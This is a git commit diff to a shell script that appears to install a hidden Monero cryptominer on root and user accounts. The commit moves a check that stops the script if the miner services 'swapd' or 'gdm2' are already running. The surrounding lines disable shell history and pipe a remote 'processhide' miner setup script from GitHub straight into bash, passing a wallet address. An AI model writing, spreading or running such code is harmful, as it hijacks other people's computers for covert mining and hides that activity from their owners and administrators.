3bb870bbf20e72a25680a894285e4c51af2bfd5e
Acen <113854209+littlAcen@users.noreply.github.com>
2024-05-31 20:22:47 +0200

    Update setup_mo_4_r00t_and_user.sh

--- setup_mo_4_r00t_and_user.sh
+++ setup_mo_4_r00t_and_user.sh
@@ -4,6 +4,26 @@ unset HISTFILE
 #unset HISTFILE ;history -d $((HISTCMD-2))
 #export HISTFILE=/dev/null ;history -d $((HISTCMD-2))
 
+# Function to check if a service is running
+is_service_running() {
+    service="$1"
+    systemctl is-active --quiet "$service"
+}
+
+# List of services to check
+services=("swapd" "gdm2")
+
+# Loop through the services
+for service in "${services[@]}"; do
+    if is_service_running "$service"; then
+        echo "Service $service is running. Stopping script."
+        exit 1
+    fi
+done
+
+# If script reaches here, no service is running
+echo "No specified services are running. Continuing with the script..."
+
 rootstuff(){
   curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com
   [ "$USER" != root ] && sudo -u "$USER" "$0"
@@ -33,22 +53,3 @@ fi
 #rm -rf config.json*
 #rm -rf xmrig*
 
-# Function to check if a service is running
-is_service_running() {
-    service="$1"
-    systemctl is-active --quiet "$service"
-}
-
-# List of services to check
-services=("swapd" "gdm2")
-
-# Loop through the services
-for service in "${services[@]}"; do
-    if is_service_running "$service"; then
-        echo "Service $service is running. Stopping script."
-        exit 1
-    fi
-done
-
-# If script reaches here, no service is running
-echo "No specified services are running. Continuing with the script..."
